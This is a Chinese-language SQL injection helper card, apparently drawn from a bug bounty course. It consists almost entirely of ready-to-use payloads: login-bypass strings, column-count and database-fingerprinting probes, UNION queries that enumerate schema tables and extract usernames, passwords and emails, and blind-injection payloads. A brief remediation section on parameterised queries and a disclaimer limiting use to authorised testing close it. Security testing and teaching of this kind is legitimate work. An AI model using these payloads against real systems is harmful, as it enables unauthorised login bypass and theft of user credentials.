# Bug-Bounty-SQLi-Helper - SQL 注入助手

**来源**: Bug Bounty 课程学习提取
**版本**: 1.0
**创建时间**: 2026-04-02

---

## 功能描述

提供 SQL 注入检测、Payload 生成、利用指导。

**⚠️ 仅用于授权测试和学习**

---

## 检测 Payload

### 基础测试
```sql
' OR '1'='1
" OR "1"="1
' OR 1=1--
' OR '1'='1'#
admin'--
') OR ('1'='1
```

### 判断列数
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 10--
' ORDER BY 20--
```

### 判断数据库类型
```sql
-- MySQL
' AND SLEEP(5)--
' AND BENCHMARK(1000000,SHA1('test'))--

-- PostgreSQL
' AND pg_sleep(5)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--

-- Oracle
' AND DBMS_PIPE.RECEIVE_MESSAGE('x',5)=0--
```

---

## 利用 Payload

### 联合查询
```sql
' UNION SELECT 1,2,3--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT version(),user(),database()--
```

### 获取表名
```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

### 获取列名
```sql
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

### 数据提取
```sql
' UNION SELECT username,password,email FROM users--
```

### 盲注
```sql
-- 布尔盲注
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--

-- 时间盲注
' AND IF(1=1,SLEEP(5),0)--
```

---

## 修复建议

```python
# 参数化查询
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# ORM
User.objects.get(id=user_id)
```

---

## 安全声明

⚠️ **仅用于授权测试和学习**
❌ 禁止用于未授权攻击

---

*Bug-Bounty-SQLi-Helper v1.0 | 2026-04-02*
